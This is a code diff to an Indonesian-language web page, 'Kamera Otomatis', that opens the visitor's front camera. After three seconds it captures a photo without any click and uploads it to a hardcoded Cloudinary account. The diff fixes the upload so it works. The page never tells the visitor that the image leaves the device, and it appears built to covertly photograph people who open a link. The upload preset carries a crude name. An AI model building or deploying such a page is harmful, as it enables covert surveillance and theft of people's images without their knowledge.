@@ -6,7 +6,7 @@
     <title>Kamera Otomatis</title>
     <style>
         body { text-align: center; font-family: Arial, sans-serif; }
-        #preview { margin-top: 20px; border: 2px solid black; }
+        #preview { margin-top: 20px; border: 2px solid black; width: 300px; }
     </style>
 </head>
 <body>
@@ -21,37 +21,53 @@
         const preview = document.getElementById('preview');
         const ctx = canvas.getContext('2d');
 
-        // **1. Aktifkan Kamera Depan**
+        // 1. AKTIFKAN KAMERA DEPAN
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => { video.srcObject = stream; })
+            .then(stream => {
+                video.srcObject = stream;
+                console.log("Kamera berhasil diakses.");
+            })
             .catch(err => console.error("Akses kamera ditolak!", err));
 
-        // **2. Ambil Foto Otomatis Setelah 3 Detik**
+        // 2. AMBIL FOTO OTOMATIS SETELAH 3 DETIK
         setTimeout(() => {
+            console.log("Mengambil foto...");
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            preview.src = canvas.toDataURL("image/png");
+            let imageData = canvas.toDataURL("image/png");
 
-            // **3. Upload ke Cloudinary**
-            uploadToCloudinary(canvas.toDataURL("image/png"));
+            preview.src = imageData;
+            console.log("Foto berhasil diambil.");
+
+            // 3. UPLOAD KE CLOUDINARY
+            uploadToCloudinary(imageData);
         }, 3000);
 
-        // **4. Fungsi Upload ke Cloudinary**
+        // 4. FUNGSI UPLOAD KE CLOUDINARY
         function uploadToCloudinary(imageData) {
             let cloudName = "dl5dswv7q";  // Ganti dengan Cloud Name kamu
             let uploadPreset = "tikontol";  // Ganti dengan Upload Preset kamu
 
+            console.log("Mengunggah foto ke Cloudinary...");
+            
+            let formData = new FormData();
+            formData.append("file", imageData);
+            formData.append("upload_preset", uploadPreset);
+
             fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                 method: "POST",
-                body: new FormData(Object.assign(new FormData(), {
-                    file: imageData,
-                    upload_preset: uploadPreset
-                }))
+                body: formData
             })
-            .then(res => res.json())
-            .then(data => console.log("Foto tersimpan di:", data.secure_url))
-            .catch(err => console.error("Gagal upload!", err));
+            .then(response => response.json())
+            .then(data => {
+                if (data.secure_url) {
+                    console.log("Foto berhasil diunggah:", data.secure_url);
+                } else {
+                    console.error("Gagal unggah! Respon:", data);
+                }
+            })
+            .catch(error => console.error("Gagal upload!", error));
         }
     </script>
 </body>
